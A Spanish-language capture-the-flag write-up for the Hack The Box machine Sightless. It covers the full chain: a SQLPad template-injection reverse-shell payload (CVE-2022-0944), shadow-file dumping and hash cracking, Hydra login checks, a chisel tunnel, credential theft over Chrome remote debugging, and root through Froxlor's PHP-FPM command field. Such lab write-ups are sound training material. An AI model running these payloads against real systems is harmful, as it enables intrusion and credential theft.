---
description: >-
  Writeup de la máquina de dificultad fácil Sightless de la página https://hackthebox.eu
title: Hack The Box - Sightless | (Difficulty Easy) - Linux
date: 2025-01-16
categories: [Hack the Box, Writeup]
tags: [htb, hacking, hack the box, linux, easy, writeup, redteam, pentesting]
image_post: true
image: https://github.com/user-attachments/assets/3369b1c5-339a-4c19-abb3-aa5b8226b4ea
---

## Useful Skills

* Web enumeration
* Abusing Template Injection to RCE (SQLPad 6.10.0 - CVE-2022-0944) [Gain access]
* Cracking /etc/shadow users hashes to escape the container
* Hydra brute force to validate passwords
* Monitoring system process with pspy
* Chisel Remote Port Forwarding
* Chrome Remote Debugger Pentesting
* Froxlor Authenticated RCE via PHP-FPM

## Enumeration

### TCP Scan

 ```bash
rustscan -a 10.10.11.32 --ulimit 5000 -g
10.10.11.32 -> [21,22,80]
```

```bash
nmap -p22,21,80 -sCV 10.10.11.32 -oN tcpScan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-16 15:10 CET
Nmap scan report for 10.10.11.32
Host is up (0.036s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://sightless.htb/
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=1/16%Time=67891346%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,A0,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x20
SF:Server\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\x20
SF:try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x
SF:20being\x20more\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.07 seconds
```

### UDP Scan

 ```bash
nmap -sU --top-ports 1500 --min-rate 5000 -n -Pn 10.10.11.32 -oN udpScan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-16 15:13 CET
Nmap scan report for 10.10.11.32
Host is up (0.038s latency).
Not shown: 1494 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
17146/udp closed unknown
17494/udp closed unknown
27682/udp closed unknown
36384/udp closed unknown
44334/udp closed unknown
49207/udp closed unknown
```

### FTP Enumeration

En el puerto 21/TCP observo un servidor ProFTPD asociado a un nombre de dominio llamado sightless.htb. Por otra parte no se puede visualizar en el escaneo la versión y no se detecta anonymous login

> Hay que añadir el dominio sightless.htb en el archivo de configuración /etc/hosts para que se puede resolver el nombre de dominio a la dirección IP 10.10.11.32
{: .prompt-tip }

### HTTP Enumeration

Whatweb reporta que se produce una redirección desde http://10.10.11.32 a http://sightless.htb/, un email el cual es sales@sightless.htb y un servidor Nginx 1.18.0

```bash
whatweb http://10.10.11.32
http://10.10.11.32 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.32], RedirectLocation[http://sightless.htb/], Title[302 Found], nginx[1.18.0]
http://sightless.htb/ [200 OK] Country[RESERVED][ZZ], Email[sales@sightless.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.32], Title[Sightless.htb], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

Accediendo a la página en http://sightless.htb/ se puede observar una web de una empresa que se dedidca a la gestión de bases de datos y servidores.

![imagen](https://github.com/user-attachments/assets/0bbc6ad5-d426-4d78-8882-91bf492d9e93)

En la sección services de la página web puedo observar diferentes servicios, son tres servicios:

* SQLPad: Es una aplicación web que permite a los usuarios conectarse a varios servidores SQL a través de un navegador.
* Froxlor: Es un Panel de control de servidores multilenguaje, con una interfaz gráfica web que permite administrar, entre otros, los servicios de correo electrónico, dominios y FTP.
* Database & Server Management: Gestión de bases de datos y sistemas.

![imagen](https://github.com/user-attachments/assets/e8b9c0a5-e01c-449e-a4c9-a01e71dbba80)

> Puede que se esté utilizando Froxlor para administrir el servidor FTP que se ha detectado en el escaneo de puertos
{: .prompt-info }

Intento acceder al primer servicio, obtengo un error del navegador el cual me indica que no se puede conectar a sqlpad.sightless.htb

![imagen](https://github.com/user-attachments/assets/9062ad9d-f74c-461f-b9e4-5fc531820fde)

> Hay que añadir el dominio sqlpad.sightless.htb en el archivo de configuración /etc/hosts para que se puede resolver el nombre de dominio a la dirección IP 10.10.11.32
{: .prompt-tip }

Intento acceder nuevamente a http://sqlpad.sightless.htb, la primera visión que obtengo es la aplicación gráfica SQLPad la cual permite conectarse a diferentes servidores SQL

![imagen](https://github.com/user-attachments/assets/7985ef2f-d2d6-4cef-8ead-23ca92e06703)

En la parte superior derecha observo tres puntos al hacer clic sobre los mismos puedo ver una opción About, al acceder la misma puedo descubrir la versión de SQLPad, la cual es 6.10.0

![imagen](https://github.com/user-attachments/assets/d6d8f19e-024a-425b-b28a-2cc26f6997eb)

![imagen](https://github.com/user-attachments/assets/cd4608e6-21df-494a-9870-d5fcc254d1b9)

> Sabiendo que es SQLPad y que la versión es 6.10.0 puedo buscar información sobre posibles vulnerabilidades existentes
{: .prompt-info }

## Vulnerability analysis

### CVE-2022-0944 (SQLPad Remote Command Execution)

Una pequeña búsqueda en internet me permite dar con la vulnerabilidad CVE-2022-0944, se trata de una vulnerabilidad que permite la ejecución remota de código a través una template injection en el endpoint /api/test-connectionendpoint

* [NVD Explanation CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

## Exploitation

### Abusing SQLPad RCE Vulnerability (CVE-2022-0944)

En huntr encuentro un post sobre la vulnerabilidad CVE-2022-0944 el cual me sirven de guía para realizar la explotación de forma manual y entender como funciona todo.

* [Template injection in connection test endpoint leads to RCE in sqlpad/sqlpad](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb)

![imagen](https://github.com/user-attachments/assets/d13e1b2f-7fd7-44a0-96cb-0af165a8ed49)

El primer paso es acceder a connections y añadir una nueva conexión

![imagen](https://github.com/user-attachments/assets/50020b32-c3e5-4479-b554-292d502a6aa3)

![imagen](https://github.com/user-attachments/assets/7ccc4636-ab54-46a5-a53c-b8c20053c1ca)

Selecciono MySQL como Driver

![imagen](https://github.com/user-attachments/assets/9d039b44-3b7d-4a06-9139-f9e7a8f29eb5)

Inicio un listener con netcat por el puerto 4444 para obtener la reverse shell al ejecutar la inyección

```bash
nc -lvnp 4444
listening on [any] 4444 .
```

En el campo Database introduzco el payload que contiene la inyección acomodada para enviar una reverse shell hacia mi máquina de atacante

> Payload: {{ process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/10.10.14.160/4444 0>&1"') }}
{: .prompt-info }

![imagen](https://github.com/user-attachments/assets/1f6803ec-b88d-4908-a167-8e2e991b41a0)

Por ultimo hago clic sobre Test y obtengo la reverse shell como usuario root pero a un contenedor, ya que la IP victima es la 10.10.11.32 y me encuentro en la 172.17.0.2

![imagen](https://github.com/user-attachments/assets/d3a1df29-b740-4234-91ac-243e50530d1d)

```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.160] from (UNKNOWN) [10.10.11.32] 47918
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@c184118df0a6:/var/lib/sqlpad# hostname -I
172.17.0.2
```

## Post exploitation

### Lateral Movement

Tengo que buscar alguna forma de escapar del contenedor, comienzo visualizando los usuarios del sistema, veo que existen diferentes usuarios a parte de root

```bash
root@c184118df0a6:/var/lib/sqlpad# cat /etc/passwd | grep sh$
cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
node:x:1000:1000::/home/node:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash
```

Listo el contenido que existen el directorio acutal y puedo ver un archivo curioso llamado sqlpad.sqlite, al listar su contenido a simple vista no observo ninguna fuga de información

```bash
root@c184118df0a6:/var/lib/sqlpad# ls
cache
sessions
sqlpad.sqlite
```
Otra opción es intentar dumpear las credenciales de los usuarios fusionando con unshadow los archivos /etc/passwd y /etc/shadow e intentar creackear los hashes con John The Ripper

```bash
root@c184118df0a6:/var/lib/sqlpad#cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash
```

```bash
root@c184118df0a6:/var/lib/sqlpad# cat /etc/shadow
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
daemon:*:19051:0:99999:7:::
bin:*:19051:0:99999:7:::
sys:*:19051:0:99999:7:::
sync:*:19051:0:99999:7:::
games:*:19051:0:99999:7:::
man:*:19051:0:99999:7:::
lp:*:19051:0:99999:7:::
mail:*:19051:0:99999:7:::
news:*:19051:0:99999:7:::
uucp:*:19051:0:99999:7:::
proxy:*:19051:0:99999:7:::
www-data:*:19051:0:99999:7:::
backup:*:19051:0:99999:7:::
list:*:19051:0:99999:7:::
irc:*:19051:0:99999:7:::
gnats:*:19051:0:99999:7:::
nobody:*:19051:0:99999:7:::
_apt:*:19051:0:99999:7:::
node:!:19053:0:99999:7:::
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
```

```bash
unshadow passwd shadow > unshadow
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt unshadow
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
blindside        (root)     
insaneclownposse (michael)     
2g 0:00:00:24 DONE (2025-01-16 17:17) 0.08203g/s 2415p/s 4053c/s 4053C/s kruimel..bluedolphin
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Soy capaz de cracker las contraseñas de el usuario root y el usuario michael, ahora utilizo hydra para validar dichas credenciales mediante fuerza bruta

```bash
 hydra -L users.txt -P creds.txt ssh://10.10.11.32
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-16 17:21:21
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:2/p:2), ~1 try per task
[DATA] attacking ssh://10.10.11.32:22/
[22][ssh] host: 10.10.11.32   login: michael   password: insaneclownposse
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-16 17:21:27
```

Como resultado obtengo que la contraseña insaneclownposse es válida para michael, por lo que conecto por ssh.

```bash
ssh michael@10.10.11.32
The authenticity of host '10.10.11.32 (10.10.11.32)' can't be established.
ED25519 key fingerprint is SHA256:L+MjNuOUpEDeXYX6Ucy5RCzbINIjBx2qhJQKjYrExig.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.32' (ED25519) to the list of known hosts.
michael@10.10.11.32's password: 
Last login: Thu Jan 16 13:01:27 2025 from 10.10.14.136
-bash-5.1$ whoami
michael
```

### Privilege escalation

Utilizo la herramienta linpeas para intentar identificar posibles formas de escalar privilegios

```bash
michael@sightless:/tmp$ ./linpeas.sh > linout.txt
```

En linpeas tenemos diferentes colores los cuales indican el nivel de importancia de lo que se reporta, analizando el archivo linout.txt puedo observar un RED/YELLOW lo que indica al 95% un vector de explotación potencial. Puedo observar que el usuario john esta corriendo el proceso /opt/google/chrome/chrome y se resalta el parámetro --remote-debugging-port=0.

![imagen](https://github.com/user-attachments/assets/da6173ef-1540-4e3a-ab91-5e4d2b93951f)

Investigando averiguo que el parámetro --remote-debugging-port , habilita la depuración remota y un atacante podría acceder al navegador de forma remota y ejecutar comandos, acceder a la información de navegación, o incluso inyectar código JavaScript, el 0 indica que chrome elegirá aletoriamente un puerto disponible para habilitar la depuración remota.

* [Chrome Remote Debugger Pentesting](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/)

![imagen](https://github.com/user-attachments/assets/c1b18840-387c-40e3-9e4e-c046ee096793)

Ejecuto el comando netstat para ver los puertos internos abiertos, puedo observar puertos bastante llamativos como el 8080, 46687, 39391, 33617, 3000

```bash
michael@sightless:/tmp$ netstat -tulpen
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      115        26880      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      102        23379      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      0          25797      -                   
tcp        0      0 127.0.0.1:46687         0.0.0.0:*               LISTEN      1001       27278      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      115        26757      -                   
tcp        0      0 127.0.0.1:39391         0.0.0.0:*               LISTEN      1001       27654      -                   
tcp        0      0 127.0.0.1:33617         0.0.0.0:*               LISTEN      0          25863      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      0          26238      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          25753      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      0          25783      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      116        25884      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      0          25764      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           102        23378      -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           0          23391     
```

Utilzaré chisel para realizar un Remote Port Forwarding y exponer los servicios locales a mi máquina remota, para ello me transfiero el binario

```bash
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
michael@sightless:/tmp$ wget http://10.10.14.160:8000/chisel
--2025-01-17 14:21:47--  http://10.10.14.160:8000/chisel
Connecting to 10.10.14.160:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8077312 (7.7M) [application/octet-stream]
Saving to: ‘chisel
```

Ejecuto chisel como servidor en mi máquina de atacante, escuchando por el puerto 1234 y creando un túnel inverso

```bash
./chisel server --reverse -p 1234
2025/01/17 15:22:32 server: Reverse tunnelling enabled
2025/01/17 15:22:32 server: Fingerprint Cq9ffrNtMD6l+/Nv28Tu0ByRkh0g48KPwVakVOFn8/Y=
2025/01/17 15:22:32 server: Listening on http://0.0.0.0:1234
```

Ejecuta chisel como cliente en la máquina victima y me conecto al tunel de mi máquina de atacante redirigiendo todo el tráfico de los puertos 8080, 46687, 39391, 33617, 3000

```bash
michael@sightless:/tmp$ ./chisel client 10.10.14.160:1234 R:8080:0.0.0.0:8080 R:46687:0.0.0.0:46687 R:39391:0.0.0.0:39391 R:33617:0.0.0.0:33617 R:3000:0.0.0.0:3000
2025/01/17 14:30:47 client: Connecting to ws://10.10.14.160:1234
2025/01/17 14:30:48 client: Connected (Latency 36.055714ms)
```

```bash
2025/01/17 15:30:49 server: session#1: tun: proxy#R:8080=>0.0.0.0:8080: Listening
2025/01/17 15:30:49 server: session#1: tun: proxy#R:46687=>0.0.0.0:46687: Listening
2025/01/17 15:30:49 server: session#1: tun: proxy#R:39391=>0.0.0.0:39391: Listening
2025/01/17 15:30:49 server: session#1: tun: proxy#R:33617=>0.0.0.0:33617: Listening
2025/01/17 15:30:49 server: session#1: tun: proxy#R:3000=>0.0.0.0:3000: Listening
```

El siguiente paso es abrir el navegador chrome e introducir la cadena chrome://inspect/#devices en la barra de URL

![imagen](https://github.com/user-attachments/assets/6d5e92cf-ce1a-4e2e-8129-3ee6cf42becb)

A continuación, hay que hacer clic en Configure e introducir los puertos para ir porbando cual es el correcto, en este caso el puerto correcto es 46687

![imagen](https://github.com/user-attachments/assets/0e26f26a-fa28-4d0d-887b-aa9bde3233d8)

Puedo observar un subdominio el cual es admin.sightless.htb y accede a Froxlor a través del puerto 8080

![imagen](https://github.com/user-attachments/assets/9c370935-35ea-4df3-b69a-10affac51976)

> Hay que añadir el dominio admin.sightless.htb en el archivo de configuración /etc/hosts para que se puede resolver el nombre de dominio a la dirección IP
{: .prompt-tip }

Al inspeccionar el objetivo remoto consigo ver que se está logueando en el panel de Froxlor y obtengo las credenciales de acceso las cuales son admin:ForlorfroxAdmin

![imagen](https://github.com/user-attachments/assets/d9db8d11-3135-4e87-8955-2eb51851bcff)

Me dirigo al panel de autenticación a través del puerto 8080 y accedo haciendo uso de las credenciales

![imagen](https://github.com/user-attachments/assets/6dfeb893-ed27-448e-ad80-7b46254da0b7)

Al acceder lo primero que me llama la atencion en la parte superior derecha es la versión de Floxror, la cual es 2.1.8

![imagen](https://github.com/user-attachments/assets/27286ff7-dfe7-486d-9518-64102a53c71b)

> Sabiendo que es Froxlor y que la versión es 2.1.8 puedo buscar información sobre posibles vulnerabilidades existentes
{: .prompt-info }

Investigando doy con un articulo el cual explica como realizar un RCE en PHP-FPM versions, la vulnerabilidad se acontece al crear un nuevo PHP version y en el apartado php-fpm restart command inyectar codigo arbitrario, el cual se ejecutara al reiniciar el servicio.

* [Disclosing Froxlor V2.x Authenticated RCE as Root Vulnerability via PHP-FPM](https://medium.com/@sarperavci/disclosing-froxlor-v2-x-authenticated-rce-as-root-vulnerability-via-php-fpm-be23febb68c7)

![imagen](https://github.com/user-attachments/assets/226ad0c5-c53a-49c1-a8b4-3329953a7f4d)

Accedo a PHP-FPM versions y hago clic sobre create new PHP version.

![imagen](https://github.com/user-attachments/assets/acf336d2-7ea3-4e5a-8afe-c190eb392cd4)

En el apartado php-fpm restart commando doy permisos SUID a /bin/bash

![imagen](https://github.com/user-attachments/assets/3343accc-31f8-41b4-9ad4-a52bebcd9042)

![imagen](https://github.com/user-attachments/assets/834ea242-102e-41e0-9a64-d7e0beb4b262)

Me dirigo a System/Settings y PHP-FPM, deshabilito php-fpm y guardo los cambios

![imagen](https://github.com/user-attachments/assets/d4123189-fed8-4376-85ac-80c51f4d3d34)

![imagen](https://github.com/user-attachments/assets/bfd89824-1552-4a23-8ae1-2492dedfb514)

Vuelvo a entrar y activo php-fpm y guardo los cambios

![imagen](https://github.com/user-attachments/assets/38c25550-019c-4e01-aa63-d8dbe73ea1ff)

![imagen](https://github.com/user-attachments/assets/0210ab7c-ecaf-4cd5-a51d-8fb23cc8f489)

Por ultimo compruebo que se hayan otorgado los permisos SUID y spawneeo un shell como root

```bash
michael@sightless:/tmp$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1396520 Mar 14  2024 /bin/bash
michael@sightless:/tmp$ bash -p
bash-5.1# whoami
root
```
